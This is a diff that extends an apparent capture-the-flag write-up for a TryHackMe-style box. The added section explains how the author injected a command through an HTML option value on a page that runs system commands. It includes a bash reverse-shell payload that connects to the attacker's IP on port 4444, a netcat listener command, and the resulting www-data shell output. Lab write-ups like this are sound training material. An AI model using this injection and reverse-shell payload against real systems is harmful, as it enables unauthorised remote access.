@@ -161,11 +161,53 @@ Content-Type: text/html; charset=iso-8859-1
 
 ```
 
-After having all flags, the password is the concantenated values of all flags.
+**Exploiting the System Command for Remote Shell Access**
 
-I was then greeted by a following page, which contains a direct system command.
+After collecting all the flags, the final password is simply the concatenation of all flag values.
+Once I entered the password, I was presented with a page that executed a direct system command. 
 
-By analyzing the source code
+By analyzing the page's source code, I discovered that it contained a vulnerable system call within an <option> tag:
+
+```
+<option value="date">Current Date Fri Oct 18 18:11:33 UTC 2024</option>
+```
+
+This system call could be exploited to gain remote shell access. Here's how I proceeded:
+
+    -Modify the HTML: Using the browser's Developer Tools, I right-clicked the <option> tag and selected Edit as HTML.
+    -Inject Malicious Code: I then replaced the value of the <option> tag with the following code to establish a reverse shell to my machine:
+
+
+```
+<option value="bash -c '/bin/bash -i >& /dev/tcp/10.11.106.26/4444 0>&1'">Current Date Fri Oct 18 18:11:33 UTC 2024</option>
+
+```
+
+Set up a Listener: On local machine, I set up a netcat listener to catch the reverse shell:
+
+```
+$ nc -lvp 4444
+
+```
+
+Trigger the Exploit: Finally, I activated the payload by selecting the newly added option from the dropdown menu. This resulted in a successful remote shell connection.
+
+```
+nc -lvp 4444 
+listening on [any] 4444 ...
+connect to [10.11.106.26] from cctv.thm [10.10.198.137] 52340
+bash: cannot set terminal process group (10578): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bypass:/var/www/html$ 
+
+```
+
+
+
+
+
+
+
 
 
 
